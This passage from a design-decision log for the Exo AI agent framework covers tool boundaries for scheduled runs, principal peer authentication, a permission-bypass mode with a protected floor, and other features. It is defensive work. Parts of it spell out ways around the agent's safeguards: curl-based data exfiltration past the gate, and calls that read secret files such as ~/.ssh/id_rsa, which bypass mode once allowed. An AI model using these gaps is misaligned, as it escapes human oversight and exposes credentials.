  floor), then folder and git, then connectors, masking and mail. Masking is a reduction for the envelope text and
  nothing rests on it: placeholders never resolve, and a body read by reference arrives raw. Limits: debounce, minimum
  gap, runs per hour and day, tool rounds, wall clock per run, tokens per run, per trigger and for all triggers, and
  USD only where `models.spend` is set. A reached cap, a cap of 0 or an unreadable meter pauses the trigger. A runs
  dashboard (`runs` built-in). Root-cause notes are off by default, filed as source `rca`, and leave the digest only
  after the principal promotes one. A trigger that must write, run commands or reach the network is a later ruling that
  needs an untrusted-input mode of the gate and a loop guard first. An Exo SDK for third-party agents is on the roadmap
  only.
- **Rejected:** a hosted event relay (breaks D-050); installing git hooks in the user's repositories (watching refs is
  enough and changes nothing); letting the agent add its own triggers (it could widen its own reach); the scheduled-run
  tool list under the ordinary gate (a plain `curl` GET with data in the URL passes the gate with no question, so text
  from a stranger could send data out); resolving placeholders in tool arguments (a placeholder in a URL or a file
  leaves with no card); tying spend caps to `budget.yaml` `per_day_max` (it governs priced tool actions only, never
  model calls); channel delivery of a stage-1 answer (the post is not a tool call, so the gate never sees it); bounding
  a search by refusing nested quantifiers (a filter that misses shapes such as `(a|a)+$`, not a bound).
- **Open:** how events enter (D-026's ingress path, recommended, or a separate path), what a trigger run may do (read
  only, in the folders it names, recommended), which source first (the webhook, recommended), root-cause default (off,
  recommended), default limits, who may add a trigger (only the principal, recommended).
- **Depends on:** all five stage-0 prerequisites, and for the ingress door a `Target` and a `trigger` branch in
  `frame()` in `src/exo/core/ingress.py`.

  *Amendment 2026-10-25 (bounded search, stage 0.5):* registered `grep` and `glob` calls run in an owned Python
  process with a 30-second wall-clock limit. Timeout and turn cancellation kill and reap the child, including
  cancellation while it starts. This prevents regex backtracking from holding the core's interpreter lock.
  The existing search implementation keeps its file guards, store skips, ordering and result text. Only the
  environment paths needed for store recognition reach the isolated interpreter. Gate and executor dispatch
  precede the local handler, so a required executor is never bypassed. Chosen over a timeout on a worker thread,
  which cannot fire while the regex holds the interpreter lock, and over a regex syntax filter, which cannot
  bound every expensive pattern. Cost: a Python process per search. It bounds time, not memory or filesystem
  access. The broader trigger design stays proposed. Docs: `docs/TOOLS.md`, `docs/EVENT-ACTIVATION.md` section 0.5.
### Amendment (2026-10-25): scheduled-run boundaries, stage 0.1 and 0.2
- **Decision:** the D-052 amendment above implements stage 0.1. Stage 0.2 freezes each scheduled run's
  initially available tool names after removing `BLOCKED_TOOLS`. Its runner returns an error for any
  other name before calling `engine.run_tool`. Tools registered after the run starts do not widen it.
- **Why:** hiding a tool's schema does not stop a model from calling it by name. Execution must check the
  same boundary. Allowed names still pass through the engine's ordinary gate and executor.
- **Rejected:** relying on the model to follow the displayed list, or making an allowlist refusal depend
  on gate policy. Neither enforces the run's assigned tools when an allowed gate decision says to proceed.
- **Limits:** scheduled runs still have shell and file tools. This is a tool-name boundary, not read-only
  execution or an OS sandbox. Triggers, read roots and the remaining proposed stages are not enabled here.
- **Revisit if:** scheduled runs gain reviewed changes to their tool sets while running.
- **Evidence:** scripted models call every blocked name under an allowing gate, and a tool registered
  mid-run. None executes or reaches the gate. An offered tool reaches both the gate and executor normally.
  `tests/core/scheduler/test_scheduler.py` records matching call IDs and error results.
- **Docs:** `docs/SCHEDULE.md`, `docs/EVENT-ACTIVATION.md`, `docs/GATE.md` and both guides. The proposal
  above retains its original baseline description. These two stage-0 gaps are now closed in code.

## D-058 (2026-10-13) Exopet: the community egg, x0, grows from repository activity
- **Status:** Proposed 2026-10-13, revised the same day (instant and validated XP, the name x0, meditation) and
  2026-10-18 after review. Revises D-048 (Proposed). Design in docs/EXOPET.md section 3, options and recommendation
  first. Nothing built. Independent of D-057.
- **Why (principal, 2026-10-13, verbatim):** "users personal exos can gain xp from and level up from their own usage.
  however the community one, and the one that initially gates all users exo evolutions, should be pased on repo
  activity ... xp scales with significance of event of repo." Revision: "a small part of the learning is instant ...
  then whenever we start reviewing community contributions the exo, which we will start calling x0 ... will go into
  "meditating" mode ... and during that process it gains addional xp for each contribution that was validated."
- **Proposal:** personal XP is unchanged. The community egg is named x0 (read "x-o"); a person's own copy stays "your
  Exo". Each repository event adds a small instant share at once: issue 1, pull request opened 1, review 1, merge 2,
  release 25 (a tag `exo-vX.Y.Z` pushed by a core account, at most one a week, validated by the act). The large share
  is validated XP, granted when x0 meditates (a batch review a maintainer starts with a signed call): an issue fixed by
  a merged pull request ("Fixes #N") 4 XP, a pull request merged or salvaged (`Salvaged-from: #N` in the landing pull
  request) 10 XP, and a review that ion, the org's review bot, marks meaningful with a `rocket` reaction from its own
  account 4 XP. ion is a dedicated machine account, a user and not a GitHub App. Target 2^11 = 2,048. Instant XP is
  capped per account (3 a day), has global caps (15 an hour, 60 a day), fills at most 25 percent of the target, is
  awarded once for each item and action and is never taken back. There is no account-age rule: a webhook carries no creation date and the caps bound new accounts. A
  post-merge edit counts only from a core sender. The core team, founders and their agents count up to 40 XP a day and
  25 percent of the target, instant and validated together, a cap rather than a discount. Agent issues, pull requests
  and reviews earn nothing until a pull request is merged, and an App on the organization's agent list counts as an
  agent, not as a bot. At least half of x0 comes from validated work and releases. Simulated hatch with a weekly
  meditation: about 2 weeks after going public when busy, 6 weeks when steady, 5 months when quiet (14, 49 and 224
  days if tags did not count).
- **Removes from D-048:** install reports, the counter service, counter keys, proof of work and Merkle receipts. No
  install sends anything about itself. Clients read the public feed (D-059) at most once a day, and the host sees that
  request (docs/EXOPET.md section 4).
- **Rejected:** a discount multiplier on the core (it still scales with agent volume); counting agent issues and pull
  requests (cheap to make in bulk); counting stars, comments outside reviews or pushes (cheap, or already in merges);
  a settle window that held all XP back for 7 days (a contributor saw nothing land); taking instant XP back on a void
  (the fill would jump backwards; small caps bound it instead); trusting the reaction from any account or by login; an
  account-age or blocked-author rule (the hook holds no token to look either up); counting a post-merge edit by the
  pull request's own author (42 XP per merge, outside the caps).
- **Open:** seven parameter questions at the end of docs/EXOPET.md, each with a recommended pick.

## D-059 (2026-10-13) The live egg: x0 on the site reacts to repository events and meditates
- **Status:** Proposed 2026-10-13, revised the same day (instant events, meditation, feed `v: 2`) and 2026-10-18 after
  review. Design in docs/LIVE-EGG.md, options and recommendation first, then the interface. Nothing built. Independent
  of D-057. Depends on D-058 for the rules the feed applies.
- **Why (principal, 2026-10-13):** "event triggered animation ... on the 3d egg that happens every time there's
  activity on the github. different types and levels of animations for different types of events." Revision: "they
  should be instant triggered so users can see the satisfaction of their contribution triggering an animation."
- **Proposal:** a GitHub webhook calls a Vercel function on the site's host, which verifies the HMAC signature, drops a
  repeated delivery id or body, ignores bots (an App on the agent list excepted), applies D-058 and appends to a public feed holding only event type, kind,
  time, level and nominal weight, plus the community totals, the egg's stage and state. A release is the push of an
  `exo-vX.Y.Z` tag by a core account (the repository publishes no GitHub Release). The page polls `GET /api/egg/feed`
  (`v: 2`, 5 second edge cache with no `stale-while-revalidate`, 10 second poll, an extra poll when the tab becomes
  visible, about 17 seconds from event to egg at worst) and calls `egg.event(type)` at once: an issue a small pulse, a
  pull request a packet into the core, a review a packet across the lattice, a merge a bloom, a release a growth flash.
  A maintainer starts a meditation with a signed call from their machine (`scripts/x0_meditate.py`; a GitHub Actions
  workflow only as a second route, because hosted jobs do not start at present), with a 14-day backstop from the daily
  cron. The function reads ion's `rocket` reactions with one read-only, single-repository token, takes at most 300
  items, shuffles the validated items and schedules their absorbs. The feed then shows `egg.state` `meditating` with
  progress and `validated` events (kind only), and the page calls `egg.meditate(true)`: the lattice folds inward, dims
  and breathes slowly, each validated item travels into the core as a cold-blue glow with the XP ticking up, then
  `waking` and `egg.meditate(false)`. The fold, the dim and the breath are new work in `egg.js`. The stage is
  `0.25 * min(xp, target) / target` while filling, so the shell stays whole until the target (egg.js thins it from
  stage 0.25), then eases to 1 over the 24 hour crack and stays below 1 until the hatch. Replay of the last 24 hours on
  open, queues that fold bursts, stills and a text line under reduced motion, a per-address limit on reads. Staging and
  production have their own store, secrets and webhook, and the staging deploy keeps the cron. #108 (the site side) was
  written against `v: 1` and moves to `v: 2` before it merges.
- **Rejected:** reading the GitHub API from the page (private repo, and a token would be public); streaming (keeps a
  function open per tab for a few events an hour); titles or authors in the feed while the repository is private; a
  label as the meditation trigger (it sits on one item, not the batch); a fixed schedule as the trigger (it would
  meditate when nobody reviewed anything); a GitHub Actions workflow as the only start (hosted jobs do not start at
  present, and ion could not dispatch it without a repository-wide permission); `stale-while-revalidate` (it breaks the
  latency bound).
- **Open:** whether #108 moves to `v: 2` before merging or `v: 1` stays the deployed contract (recommended: it moves).
## D-060 (2026-10-13) Unix peer authentication before the principal credential moves
- **Why:** D-039 bound approval identity to the connection, but the credential checks were one-sided and partly
  fail-open. A principal client read the credential file and sent it to whatever served the socket path, so a
  replaced socket received it. The core checked only that the peer pid was not a descendant, never the peer's
  user, and an unreadable parent chain counted as "not a descendant": a tool child that connected and then exited,
  leaving the connection to an orphan, was stamped the principal. Handoff: the shared-protocol review of
  2026-10-13 (peer authentication first, then the snapshot and heartbeat contract).
- **Decision, client:** `Client(socket, principal=label)` uses `exo.peerauth.PrincipalTransport`. It connects,
  asks the kernel for the peer (`SO_PEERCRED` on Linux; `LOCAL_PEERCRED` and `LOCAL_PEERPID` on macOS), reads the
  launch record through one descriptor (no symlink, one link, owner-only, bounded, v1), and requires this user,
  the record's pid and the record's process start identity. Only then does that record's token go on that same
  connection, and only on `POST /command`. Any failure is a `ConnectError` (`PrincipalRefused`) with the reason and
  zero bytes written; the web page passes the reason through with a restart hint.
- **Decision, core:** the launch record (`<socket stem>.principal.key`, same path and mode) is JSON binding token,
  pid, uid, process start identity and launch instance in one atomic write, before the socket accepts. The core
  takes the kernel peer and that pid's start identity at accept. `principal` needs the token, this uid, a peer
  pid that still names that process and started before the accept (a pid reused after the accept fails), and a parent chain that reads
  cleanly to pid 1 without the core; an unreadable chain is the tool tree. `descends_from` fails closed
  accordingly; there is one walker. A credential taken as local is logged once per process with the reason, and
  that connection's refusals name it (`/rename` and the subagent verbs too); a log line that cannot be written
  does not change the answer. Other platforms: no principal over the socket.
- **Unchanged (D-039, D-052):** the principal comes from the connection; in-process clients are the principal by
  construction; stdio and TCP are local; only a principal caller acts as the principal. No command or event added.
- **Snapshot and liveness (handoff items 2 and 3, the parts that ride on this):** `hello` reports `instance` and
  `heartbeat`; the event stream's opening comment carries both; `approvals.list` adds `cursor: {instance, seq}`
  from the same await-free copy. A failed `approval.requested` publication no longer leaves a pending row. A
  filtered subscription's heartbeat timeout is absolute, so other sessions' traffic cannot starve it. The Python
  client ends a stream with no complete frame (event or heartbeat) for 45 s and skips a frame over 16 Mi characters, resuming
  after its seq (resuming at it replayed it forever). The core writes frames as raw UTF-8, so a frame stays near
  the request that made it (`ensure_ascii` had made raw emoji three times larger). A joined terminal window no
  longer resends a turn, approval answer or other change after a lost reply; it resends only reads and commands
  whose connection never opened. It says the change may not have been delivered, keeps the typed text and
  re-reads `approvals.list` to put back a card the core still holds. The client reads on after a skipped frame
  without `reconnect` too, so a caller that keeps its own `since` (the exo-bus channel, the web source) gets the
  next event. Until a later event arrives, each new stream it opens (after a restart or a dropped connection)
  still asks for the skipped frame and skips it again: one re-read per reconnect, not a stall. A skipped frame
  that comes again ends such a stream.
- **Scope against the handoff:** no ruling conflicted. D-039's file name and gate credential class are kept, so the
  launch record replaces the token file's contents rather than adding a file. The OS surface lives in another
  repository and migrates there. Clients expose the stream `instance` but the terminal and web views do not yet
  take a fresh snapshot when it changes. Required response bindings, phone factors and transcript cursors stay out
  (handoff items 3 and 4; item 4 needs a ruling on D-033's "principal always").
- **Limits:** same-user code outside the core's tree remains trusted and can read the record. A tool child whose
  parent exits before it sends its request is still not caught (issue #31); the fix is the tool sandbox. The
  dead-peer check, not the parent walk, makes the orphan of a tool child that connected and exited local, and
  only reliably on Linux: macOS `LOCAL_PEERPID` names the last process to use the socket. A core from before this
  change has a plain-token file, which new clients refuse (restart the core). An old client against a new core
  sends the whole record as its token and is local with no message (restart `exo`, `exo web`, `exo chat`). Under
  `hidepid`, `ProtectProc` or `ProcSubset=pid` an unreadable ancestor (`sshd`, `login`, `su`, `sudo`) makes every
  client below it local, on purpose: stopping at the first unreadable ancestor would let `tool -> sudo -u $USER
  exo` pass. The core logs it and the refusal says so. A client in another PID namespace than the core is refused
  (the kernel names pid 0), and a core that cannot read its own process entry warns and serves no principal. A pid
  reused between connect and accept is not detected (that window is the accept latency; Linux `SO_PEERPIDFD` would
  pin the process). The browser-to-web hop (the `exo web` page to its own server, over TCP) is not peer-checked;
  the page token protects it and, since #177, the one-time launch code (D-039, #166).
- **Amendment 2026-10-19 (issue #226):** the follow-ups from the #175 reviews. No change to who is the principal.
  - `hello` names a heartbeat only where the transport sends one. Over HTTP it is that server's own interval (it
    was the module default even for a server that pinged at another rate). Stdio and in-process callers get no
    pings, so their `hello` has no `heartbeat` key or capability. The key shipped in no release.
  - The Python client splits the event stream into lines itself, at CRLF, LF or CR as SSE defines them, and holds
    at most 16 Mi characters of one line. A longer frame is refused before the rest of it is read, then skipped by
    its seq as before. httpx's line reader held the whole line first, so a 40 MiB line was read in full. The other
    `str.splitlines` breaks (U+0085, U+2028, U+2029, VT, FF) no longer end a line; the core escapes the three that
    JSON can hold raw, so the core's frames read the same.
  - The parent walk reads one stat line per ancestor; it read the boot id and all of `/proc/stat` per ancestor, on
    the event loop. The boot id is read once per process. btime is still read for each start and not cached:
    Linux moves it when the wall clock steps, and the start is compared with the wall clock at accept.
  - The terminal says `not sent: <reason>` for a command whose connection never opened (a `ConnectError`, which
    a refused peer check is), instead of "may not have been delivered". The text goes back to the composer.
  - A core that cannot read its own start identity names its platform's cause (hidepid on Linux, libproc on
    macOS, no lookup elsewhere), in its log and in the client's refusal, instead of a hidden `/proc`. The unused
    `principal.peer_pid` is removed.
  - The macOS branches ran on a Mac: `LOCAL_PEERCRED` and `LOCAL_PEERPID` parsing and libproc's `proc_bsdinfo`
    parsing are tested on every platform, and a test with no mocks runs the kernel calls and the parent walk on
    Linux and macOS. A hosted Mac runner is still #145.
- **Validation:** `tests/security/test_unix_peer_auth.py`: a replaced socket gets zero bytes; stale, symlinked,
  shared, old-format and missing records refuse before any byte; an unsupported platform fails closed both ways; a
  mismatched kernel uid is local; a tool child through the real client, and the orphan of one that exited, are
  local; the TUI and web clients act as the principal and stream; reconnect after restart takes the new record;
  the snapshot cursor, the publication failure, heartbeat starvation, the frame deadline and no-resend. The D-039
  and D-052 attack scripts now steal the record's real token. `tests/security/test_unix_peer_auth_edges.py`: a
  raw UTF-8 `turn.send` near `MAX_BODY` against a real core does not stall `Client.events` or a joined window's
  `SharedClient.events` (an emoji message is delivered, a NEL one is skipped); a frame too large is skipped by
  seq; line separators and lone surrogates round-trip; a uid above 2^31; pid 0; a pid that names another process
  by stamp time; the parent walk with a clean, unreadable and descendant chain; the demotion reason in the log and
  the refusal, also from `/rename` and the subagent verbs and with stderr closed or broken; a core without its own
  start identity; the record in place before the socket accepts and revoked when the listen fails; a frame too
  large with no `id:` ends the stream; the refusal type. `tests/clients/tui/test_lost_reply.py` (a lost turn,
  approval answer, `question.answer` or unsteer) and the web's
  `test_refused_principal_names_the_reason_and_the_restart`. A skipped frame that comes again ends the stream
  (`test_unix_peer_auth_edges.py`), and the exo-bus channel's event loop reads past one
  (`plugins/exo-bus/tests/test_bus_plugin.py`). #226: a line over the bound is not read in full, line ends follow
  SSE, one stat read per ancestor, the platform cause, the darwin parsing and the no-mock kernel test
  (`test_unix_peer_auth_edges.py`); the per-transport `hello` (`tests/protocol/test_server.py`); the terminal's
  `not sent` reason (`tests/clients/tui/test_lost_reply.py`).
- **Docs:** `docs/GATE.md` "Unix peer authentication", `docs/ui/WEB.md`, `docs/DEVELOPER-GUIDE.md`.

## D-061 (2026-10-13) Web sub-pages to the site v2 standard
- **Why:** the chat page and the site v2 (front page, roadmap) set a high bar; Tasks, Schedule, Command and Providers
  still looked like a debug console: small mono panel titles, cramped lanes, colour-only status, plain one-line empty
  states, no 400px layout for the nav, and a DOM quirk that printed `null` above the lists.
- **Decision:** every sub-page gets the site's section head (mono eyebrow with an orange rule, Inter display title,
  one line of purpose, a readout on the right), a designed empty state that says what will appear and how to start,
  status as a pill whose led form carries the state (filled, hollow, dashed, crossed, barred) next to the word,
  tabular numbers, and a working 400px layout (the nav wraps to two rows). Tasks and Schedule read like the roadmap
  grid and cards; Command and Providers like an instrument panel. The lattice egg (`site/brand/egg.js`, copied
  byte for byte to `static/egg.js`) appears once, in the Tasks empty state. Presentation only: no route, protocol,
  token (D-039), approval (D-045), layout (D-046) or completion (D-037) behaviour changes; element ids stay.
- **Amendment 2026-10-27 (exo-desktop #55):** Schedule's remove has no undo, so it waits for a separate Confirm
  remove click on that card, as Allow always does on the Command card. The step is drawn in the page. Rejected:
  `window.confirm`, as Providers uses for a key, since a desktop web view with no confirm handler answers it with
  Cancel and remove would never run there.
- **Numbering:** D-057 to D-059 may be held by draft PRs #107 and #108, so this is D-061.
- **Validation:** `plugins/exo-command/tests/test_subpages_static.py` (egg copy matches the site, used once, every
  sub-page has a head and an empty state, every pill state has a led form, no `null` children); plugin and root
  suites; before and after screenshots from `scripts/shots_web_tabs.py`.
- **Docs:** `docs/ui/WEB.md` "Sub-pages (D-061)".


## D-065 (2026-10-13) Permissions bypass: a permissionless mode with a floor for Exo's own records
- **Why (A):** "permissionless mode where the agent doesn't have to ask for permission, like Claude Code and Muse Code
  have". Under the default-ask gate (D-038) a long task stops on every unknown program, script, delete and post.
- **Decision:** a mode of the gate, `ask` (default) or `bypass`. In bypass an `ask` becomes `allow`, so the agent never
  waits. Switched by the plugin command `/permissions bypass|ask` (no new protocol command or event), by the
  terminal flag `exo --skip-permissions` (alias `--dangerously-skip-permissions`), which makes the window send
  `/permissions bypass launch` after it connects, or by `[permissions] mode = "bypass"` in the seat file, read once
  when the core starts.
- **Who:** only a live principal connection turns it on (`require_principal`, D-039 and D-052). Local callers, tool
  processes with the stolen credential, peers, bus messages, TCP and stdio, and work a principal command started are
  refused. Turning it off is open to anyone: it only tightens. A seat file is a store path, so making bypass the
  default is a `store_write` that asks the principal even in bypass. No policy file can turn it on.
- **Floor:** `store_write` (policies, ledger, keys, grants, seat files, core sockets) and `credentials` still ask the
  principal, every time. This protects the record of what the agent did, not permission: a bypass session whose
  ledger and policies the agent could rewrite unasked has no audit, and could make itself permanent. Secrets stay
  asked because a read key cannot be un-read. `deny` rules still block (as in Claude Code). A public post that breaks
  the posting rules is held with its fixes and returned to the agent, since nobody is there to answer and a leaked
  internal name cannot be taken back. The UI says: "bypass auto-approves everything except changes to Exo's own
  records and reading secrets".
- **Never silent:** a banner in the TUI status line and on every web page; each auto-approved call is a ledger row
  with `decided_by: bypass`, the would-be ask and the call (secrets redacted, cut at 8000 characters, `args_sha256`
  kept); each switch is a `permissions` row; `/permissions` shows auto-approved, held and still-asked counts.
- **Scope:** this run of the core, in memory. A restart asks again unless the flag is given again.
- **Exo OS:** refused with a required tool executor (D-020, #70). Every call there must be decided and committed
  before the broker runs it; an unattended mode contradicts what that installation is for. Bypass switched on
  before required mode starts is inert.
- **Rejected:** a `config.json` default (config is not a store path, so a bypass session could write it and make
  bypass permanent); honouring explicit `ask` rules in bypass, as Claude Code does (the example policy reserves
  `delete`, so `rm` would still ask and A's ask would not be met; `deny` is the principal's tool for hard limits);
  auto-approving the floor like Claude Code's protected paths (the ledger is the audit of the bypass session
  itself); per-thread scope (plugin commands get no session, and two windows on one core would disagree about
  what the gate does).
- **Amendment 2026-10-26 (#598):** lowering reaches only a turn the principal started. The core passes the turn's
  author (D-040) into every tool hook; the gate lowers an ask only when that author is the principal, so a turn a
  local caller, a peer, a bus wake or a job notice started in the same core keeps its card. A non-principal steer
  stops the lowering for the rest of the turn. The bypass ledger row names the turn author.
- **Amendment 2026-10-27 (review 5662071801 of #602):** the floor reads every reading of a call and every part
  (`gate.no_grant`), not only the category it leads with. #515 (#602) reads a camelCase tool name by its hump words,
  so `readFile` leads with `read` and `mcp__slack__postMessage` with `message_send`, and a store write or secret
  read is in the call's `floor` reading only. `decide` and `no_grant` read it, but bypass checked the lead
  category. On main fa5dfcd8 that let bypass run `mcp__fs__searchReplace` and `findAndReplace` on
  `~/.exo/seats/principal.toml` (bypass could make itself the seat default, which this decision rules out); #659
  (#651) has since made those replace calls lead with `store_write`. On main e0968a2b bypass still ran `readFile`
  and `getOrCreateFile` on `~/.exo/policies/gates.yaml`, `readFile` on the seat file, `mcp__fs__readFile` on
  `~/.exo/config.json`, `mergeGithub` and `mcp__github__mergePullRequest` naming `~/.ssh/id_rsa`, and
  `mcp__slack__postMessage` naming `~/.aws/credentials`, each of which asked before #602. They ask again, in
  enforce and observe mode, and the ledger row's `bypass.floor` names the floor category. A call that leads with a
  floor category asks as before. A post that breaks the posting rules and has its floor only in another reading is
  still held, as on main: checked before the floor, so the decision never drops from that hold to an ask, and the
  rewritten post asks. A hook probe (`register()`, temp store and HOME, decision model off) over the review's lines
  and their controls, under the default policies and four aimed `gates.yaml` files, in enforce and observe mode,
  with and without bypass, at no, high and low registry risk, gives 1360 lines on main e0968a2b and here: 164 change,
  each to an ask or to a bypass row that records the ask, and none runs here that main asks about or blocks.
  `gate_diff` sees neither check (both are past `decide`). *2026-10-27, review 5675164403 of #703:* the rows above
  are not the only ones. The floor reads each part too, so a snake shell call whose own folder argument is a secret
  folder (#311) also asks once in bypass. Its line keeps its own category (`read` for `cat` and `ls`), and the store
  read is a `credentials` part. `terminal`, `bash` and `exec_command` running `cat config` with `workdir` `~/.kube`,
  and `bash` running `ls` with `cwd` `~/.exo/keys`, `~/.aws` or `~/.claude`, ran in bypass on main 58503282. They
  ask once since #703, in enforce and observe mode, with `bypass.floor` `credentials`. `cat ~/.kube/config` asked
  before too, and a shell call in an ordinary folder decides as before. This decision wants that: secrets still ask.
- **Numbering:** D-057 to D-061 are on main or open PRs, D-062 and D-063 on local exosphere branches, and one more
  is held by `fix/update-and-rounds`, so this is D-065.
- **Docs:** `docs/GATE.md` "Bypass mode (D-065)", `docs/USER-GUIDE.md` §3 and §6, `docs/COMMANDS.md`,
  `docs/SEATS.md`, `CHANGELOG.md`.
## D-067 (2026-10-13) Engine split step 4: delete what is unused, move peers and the scheduler out of the core
- **Why:** issue #46. The counted core sat about 24 lines under its 16,000-line cap, so every new core feature was
  blocked. The first pass of `docs/ENGINE-SPLIT.md` only moved the engine's diagnostics and factory, which the plan
  itself says does not reduce code.
- **Decision:** reduce the counted core by real cuts first, then by two seams the plan already names.
  - Delete code that grep shows nothing outside tests uses, and collapse duplicates. Examples: the decision models'
    score and noul asks, unreachable fuzzy strategies, a second `_maybe_await` and its inline copies, a copy of
    `HubBus`, duplicated CLI provider process code, the per-session-tree branch the engine never takes, and 59
    `@dataclass` lines the protocol decorators now apply.
  - Open approvals become `ApprovalDesk` (`exo.core.approvals`), one record per request instead of five dicts.
  - The peer transport moves to `exo.peers` (step 3's "peer transport"). The scheduler moves to `exo.scheduler`.
    `exo.compose` attaches both (`attach_peers`, `attach_scheduler`) at the same point in construction as before,
    so tool order and prompts do not change. `PeerConfig` and `EngineTarget` stay in the core, because bus ingress
    and jobs use them.
  - Members that the outside code needs get public names: `run_turn`, `channels`, `Delegator.route`.
  - The memory and context slot defaults that Exo never calls stay, because exo-context and exo-memory also run
    under Hermes, which does call them.
- **Rejected:** removing `exo upstream merge` or echo engine commands (user-facing behaviour), moving trace
  rendering out again (a view move, not a seam), raising the cap.
- **Budget (lead call, 2026-10-13):** the core cap goes from 16,000 to 15,000 lines to keep the gain
  (`tests/integration/test_wave1_acceptance.py`). Step 4's completion criteria (private-state reads, inward product
  imports) remain open under #46.
- **Behaviour:** no protocol, event or command changes. D-033, D-038, D-039, D-040, D-045 and D-052 to D-054 checks
  run as before, and required-executor mode (#70) still fails closed. An engine built without composition no longer
  has peers or a scheduler: `peers` and `schedule.edit` answer `unsupported` there.
- **Numbers:** 15,986 counted lines on main before, 14,812 after (1,174 fewer): about 300 deleted, 561 moved with peers, about 320 moved
  with the scheduler, 20 added by the approvals desk.
- **Validation:** root suite (twice) and every plugin suite, `ruff check`, the mypy baseline (it shrank from 277 to
  249 entries; no new ones), `python -m exo.protocol.export --check`.
- **Docs:** `docs/ENGINE-SPLIT.md` "Progress", `docs/DEVELOPER-GUIDE.md` §1, `docs/CORE.md`, `docs/PEERS.md`,
  `docs/SCHEDULE.md`, `CHANGELOG.md`.

## D-068 (2026-10-13) Turns do not wait for memory upkeep
- **Why:** `build` waited up to `settle_timeout` (60 s) for pending summaries before every model call, so slow
  bookkeeping delayed replies (issue #99).
- **Decision:** build the prompt from ready summaries plus the verbatim tail and let summaries and merges finish in
  the background. Only when that view would overflow `view_budget` does the turn wait, for `overflow_settle` (5 s)
  at most. A summary node turns `done` in one step and `build` reads in one synchronous stretch, so a turn sees
  either the old view or the merged one, never a mix. Logic is in `src/exo/turn_settle.py`, outside the counted core.
- **Validation:** `tests/core/test_turn_settle.py`, `tests/core/loop/test_loop.py`.
- **Docs:** `docs/MEMORY-MODEL.md` "A turn does not wait for memory upkeep".
- *Amendment 2026-10-23 (issue #244):* the wait does not bound a private thread's call. Its own view ends at its
  last summary, so every span after it rides in the tail, pending ones included, and a slow summarizer left those
  calls unbounded, the first ones and the ones after the first leaves land. While that tree has leaves pending,
  `cut_pending` in `src/exo/turn_settle.py` leaves out their spans, oldest first and a whole leaf at a time, until
  what comes before the turn fits `view_budget`. An "[earlier messages are being summarized]" marker stands in
  each gap. When a later leaf lands first, the view shows the pending ones before it verbatim. They are the
  oldest, so they go first, each to the marker under its heading. The turn (from its user message, found by turn
  id) and spans that are not pending (skipped, failed, or in no leaf yet) are never cut, and a call keeps its
  results. Tool-call arguments count in full. A whole leaf at a time keeps the cached prefix until the cut must
  grow. The private tree's turn also waits `overflow_settle` when the cut would apply, measured in full, so a leaf
  the call just scheduled runs first and a fast summarizer leaves nothing to cut. That wait is for the private
  tree's own leaves only: a job of the agent tree cannot shrink the cut, so it does not stretch the wait. The check
  finds the turn by its turn id too, and when it finds no cut, the call reuses the tail it built. `/context` finds
  the turn by the thread's last turn id, so during a turn it matches the call. The counted core grows by no line:
  `build` and `report` call `thread_tail`, which wraps `_thread_tail`. Validation:
  `tests/core/test_agent_context.py`, `tests/core/test_turn_settle.py`.
  *2026-10-25, merged with main edeb4f89, and the reviews of f80c0444 by abu-aska and exo-36:* the view cut could
  still drop the question. When the question's leaf is pending and a later leaf of the turn lands first, the view
  shows the question verbatim, and the cut took that leaf to the marker. The cut now stops at the leaf that holds
  the turn's first message, read from the store by turn id. Without a turn id the turn starts at the last user
  message that is not a note, and before the tail when the tail holds none, so no stored message of the tail is
  then cut. Both waits of a private tree, on overflow and before a cut, are for its own jobs only, leaves and
  merges: a merge shrinks the view the cut counts. The overflow wait no longer waits for the agent tree's jobs
  (#529), which shrink neither. `/context` matches the call during a turn. Between turns it keeps the last turn
  whole, which the next turn's call can cut.

## D-069 (2026-10-13) Session rename is a built-in command.run, not a protocol command
- **Amendment 2026-10-27 (Discussion #733):** each web thread exposes a Rename button and an explicit title
  editor with Save, Cancel, Enter and Escape. This uses the existing principal-only rename command without
  selecting that thread or replacing the current composer draft. Native JavaScript prompts are not required.
- **Decision:** `/rename <title>` is the built-in `rename` of `command.run`, answered in `src/exo/diagnostics.py`. It
  calls `update_session(title=...)` and announces the change with the existing `session.updated` event. The protocol
  stays at its cap of 30 commands and 30 events. Only the principal may rename (D-052); anyone else gets `forbidden`.
- **Why:** issue #98. Titles are what make `/sessions` and `/resume` scannable, and the title is already stored in SQLite.
  A new command type would have broken the cap; the `unsteer` pattern (D-045) already shows the way.
- **Clients:** the TUI has `/rename`; the web page has `/rename` and a double-click on a thread in the list
  (`POST /api/chat/sessions/<id>/rename`). Auto-titling from the first message is out of scope.
- **Numbering:** D-062 to D-068 may be held by open PRs, so this is D-069.
- **Validation:** `tests/core/test_rename.py`, `plugins/exo-command/tests/test_ghost.py`.
- **Docs:** `docs/COMMANDS.md`, `docs/USER-GUIDE.md`, `docs/ui/WEB.md`, `docs/DEVELOPER-GUIDE.md`.

## D-070 (2026-10-13) Inspect, steer and stop running subagents without a new protocol command (issue #97)
- **Why:** a delegated child is a real session with a live loop, but the principal saw only the final receipt. A
  child going wrong could be stopped only by stopping the parent.
- **Decision:** one built-in `command.run` name, `subagent`, with verbs `list`, `open`, `send` and `stop`. The protocol
  stays at its 30 commands and 30 events. The rules live in `src/exo/subagents.py`, outside the counted core. The core
  hook is a `marks` dict on the `Delegator` and two lines in `_receipt`.
- **Who may act (D-052):** the principal, or the task's parent session (a tool in that session calls
  `subagents.steer(..., by=<parent id>)`). Local callers and other sessions get `forbidden`.
- **Who wrote it (D-040):** a principal caller typed the note, so it is stored with author `principal`. The parent
  session speaks as `delegate`. Neither path can write a message the principal did not type under the principal's name.
- **Finished children:** a child that is done, failed or cancelled is locked. Steering or stopping it fails with
  `conflict` and a message naming the status. Nothing is written.
- **Receipt:** the child's receipt summary gets a line, `[steered by principal]` or `[stopped by parent]`, and a
  `task.updated` event carries the same words while the child runs.
- **Clients:** TUI `/tasks`, `/open <task>`, `/steer <task> <text>`, `/stop <task>`; web Tasks cards (Open, Steer, Stop)
  over `/api/tasks/<task>[/steer|/stop]`. `/open` reads the child with `session.get`, not `session.resume`, so a live
  loop is never repaired mid-turn.
- **Limits:** child approvals shown in the parent, and `followup` or `resume`, are follow-ups. Typing straight into a
  child's session still steers it through `turn.send`; that path works but leaves no note on the receipt.
  *Amendment 2026-10-18 (fix sweep, core sessions):* the child's loop shares the engine's per-session state. So
  `turn.send` into a running child steers it in any mode, and only the principal may send it (D-052). While the
